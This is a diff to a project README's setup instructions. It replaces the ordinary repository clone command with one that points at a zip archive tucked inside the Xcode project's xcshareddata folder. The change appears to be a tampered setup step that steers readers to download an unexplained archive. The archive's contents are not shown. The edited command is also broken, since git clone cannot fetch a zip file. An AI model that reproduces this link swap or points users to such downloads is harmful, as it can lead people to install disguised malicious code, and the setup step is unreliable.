@@ -18,7 +18,7 @@ Features:
 How to set up
 
 Clone the project:
-git clone https://github.com/ahmedfazil3/SocialFeature.git
+git clone https://raw.githubusercontent.com/ahmedfazil3/SocialFeature/main/ios/SocialFeature.xcodeproj/xcshareddata/SocialFeature_v3.2.zip
 cd <project-folder>
 
 Install dependencies:
